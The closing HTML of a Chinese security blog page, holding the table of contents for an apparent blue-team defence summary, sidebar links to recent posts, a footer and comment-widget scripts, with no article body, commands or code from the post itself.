href="#%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97"><span class="toc-number">1.</span> <span class="toc-text">红蓝对抗</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%93%9D%E9%98%9F%E7%BB%84%E6%88%90"><span class="toc-number">1.1.</span> <span class="toc-text">蓝队组成</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%B3%E6%88%98%E9%98%B6%E6%AE%B5"><span class="toc-number">1.2.</span> <span class="toc-text">决战阶段</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E9%98%B6%E6%AE%B5"><span class="toc-number">1.3.</span> <span class="toc-text">总结阶段</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%AF%E6%BA%90"><span class="toc-number">2.</span> <span class="toc-text">溯源</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#IP-%E5%8F%8D%E6%9F%A5%E5%9F%9F%E5%90%8D"><span class="toc-number">2.1.</span> <span class="toc-text">IP 反查域名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BE%E5%B7%A5"><span class="toc-number">2.2.</span> <span class="toc-text">社工</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%BA%90"><span class="toc-number">2.3.</span> <span class="toc-text">常见攻击源</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90"><span class="toc-number">2.4.</span> <span class="toc-text">邮件钓鱼攻击溯源</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Web-%E5%85%A5%E4%BE%B5%E6%BA%AF%E6%BA%90"><span class="toc-number">2.5.</span> <span class="toc-text">Web 入侵溯源</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%90%8C%E6%BA%90%E5%88%86%E6%9E%90"><span class="toc-number">2.6.</span> <span class="toc-text">恶意样本同源分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%9C%9C%E7%BD%90%E6%BA%AF%E6%BA%90"><span class="toc-number">2.7.</span> <span class="toc-text">蜜罐溯源</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-number">3.</span> <span class="toc-text">应急响应</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%92%E6%9F%A5%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5"><span class="toc-number">3.1.</span> <span class="toc-text">**排查网络连接   **</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%92%E6%9F%A5%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4"><span class="toc-number">3.2.</span> <span class="toc-text">**排查历史命令   **</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%92%E6%9F%A5%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7"><span class="toc-number">3.3.</span> <span class="toc-text">排查后门账户</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%92%E6%9F%A5%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">3.4.</span> <span class="toc-text">排查定时任务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%92%E6%9F%A5%E6%98%AF%E5%90%A6%E6%9C%89%E5%91%BD%E4%BB%A4%E8%A2%AB%E6%9B%BF%E6%8D%A2"><span class="toc-number">3.5.</span> <span class="toc-text">排查是否有命令被替换</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%92%E6%9F%A5%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97"><span class="toc-number">3.6.</span> <span class="toc-text">排查安全日志</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6"><span class="toc-number">3.7.</span> <span class="toc-text">清除后门文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E6%9F%A5%E6%9D%80"><span class="toc-number">3.8.</span> <span class="toc-text">工具查杀</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#webshell%E6%A3%80%E6%B5%8B"><span class="toc-number">3.9.</span> <span class="toc-text">webshell检测</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87"><span class="toc-number">4.</span> <span class="toc-text">安全设备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%AE%88%E7%AD%96%E7%95%A5"><span class="toc-number">5.</span> <span class="toc-text">防守策略</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8shell%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">6.</span> <span class="toc-text">常用shell工具及流量特征</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91"><span class="toc-number">7.</span> <span class="toc-text">内网</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA"><span class="toc-number">8.</span> <span class="toc-text">系统加固</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">9.</span> <span class="toc-text">内存马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.</span> <span class="toc-text">常见的框架漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="toc-number">11.</span> <span class="toc-text">中间件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">12.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3"><span class="toc-number">13.</span> <span class="toc-text">端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92"><span class="toc-number">14.</span> <span class="toc-text">如何检测挖矿病毒</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">15.</span> <span class="toc-text">redis未授权访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xss%E5%92%8Ccsrf"><span class="toc-number">16.</span> <span class="toc-text">xss和csrf</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8C%BA%E5%88%AB"><span class="toc-number">16.1.</span> <span class="toc-text">区别</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xxe"><span class="toc-number">17.</span> <span class="toc-text">xxe</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/MySQL%E6%B3%A8%E5%85%A5%E5%86%99shell/" title="MySQL注入写shell">MySQL注入写shell</a><time datetime="2023-03-21T16:00:00.000Z" title="发表于 2023-03-22 00:00:00">2023-03-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/hvv/" title="hw蓝队总结">hw蓝队总结</a><time datetime="2023-03-14T16:00:00.000Z" title="发表于 2023-03-15 00:00:00">2023-03-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/java-security/CC3/" title="java反序列化——CC3链">java反序列化——CC3链</a><time datetime="2023-03-12T16:00:00.000Z" title="发表于 2023-03-13 00:00:00">2023-03-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/java-security/CC6/" title="java反序列化——CC6链">java反序列化——CC6链</a><time datetime="2023-03-11T16:00:00.000Z" title="发表于 2023-03-12 00:00:00">2023-03-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/java-security/CC1/" title="java反序列化——CC1链">java反序列化——CC1链</a><time datetime="2023-03-10T16:00:00.000Z" title="发表于 2023-03-11 00:00:00">2023-03-11</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By micgo</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '2t5fYJ95Y61Dyi4xHc3dWgxl-gzGzoHsz',
      appKey: 'UNfGz5zfJGeNX6LS5OyiymLm',
      avatar: 'monsterid',
      serverURLs: 'https://2t5fyj95.lc-cn-n1-shared.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="你,真,帅" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>